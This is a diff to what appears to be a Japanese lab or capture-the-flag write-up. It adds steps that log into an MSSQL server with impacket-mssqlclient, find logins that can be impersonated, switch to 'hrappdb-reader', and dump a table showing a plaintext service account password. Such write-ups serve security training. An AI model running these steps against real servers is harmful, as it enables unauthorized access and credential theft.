@@ -42,7 +42,23 @@ PORT   STATE SERVICE REASON  VERSION
 
 # Enumeration
 
-- discoveryで接続し、hrappdになりすましてデーターベース
+- discoveryで接続し、hrappdになりすましてデーターベースからhrappdのパスワードを抽出
+```sh
+impacket-mssqlclient hokkaido-aerospace.com/discovery@$TargetIP -port 1433 -windows-auth
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+
+EXECUTE AS LOGIN = 'hrappdb-reader';
+
+USE hrappdb;
+```
+
+```sh
+SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM sysauth;
+id   name               password           
+--   ----------------   ----------------   
+ 0   b'hrapp-service'   b'Untimed$Runny'   
+```
 
 ---
 
